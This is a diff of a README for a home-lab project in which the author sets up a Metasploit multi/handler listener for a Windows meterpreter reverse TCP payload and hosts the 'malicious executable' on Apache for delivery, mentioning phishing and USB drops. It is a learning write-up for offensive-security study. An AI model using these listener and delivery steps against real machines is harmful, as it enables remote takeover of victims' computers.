@@ -50,7 +50,26 @@ With the payload created and installed to my specified path "/home/kali", I need
 
 ![msfconsole photo](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/1270309f-345b-4cbe-babe-b3c21d5cd836)
 
-Using "msfconsole", I will launch metasploit's console.
+Using the "msfconsole" command, metasploit's console will be launched. 
+
+Once the console finishes loading, I can begin creating the listener using metasploit's generic payload handling commands. 
+
+The following commands need to be entered in the console to create the listener:
+
+- use multi/handler
+- set payload windows/meterpreter/reverse_tcp
+- set LHOST 10.0.2.15
+- set LPORT 4444
+- run
+
+![awaiting connection photo 2](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/b1edd722-11ae-49c9-b932-3218328653a0)
+
+I can easily see my listener is active once the "[*] Started reverse TCP handler on 10.0.2.15:4444" is shown. 
+
+## Delivery
+Now that the malicious payload was created and the listener is active, I need to get my payload to the target machine. For this project I will be hosting the executable file on a web server using apache. Apache will accept an HTTP request from the target machine and send the malicious executable. Ordinarily the delivery can be done through social engineering, phishing emails, and USB drop attacks. 
+
+![starting apache2](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/04bf87a0-714a-4463-9980-485b14405710)
 
 
 
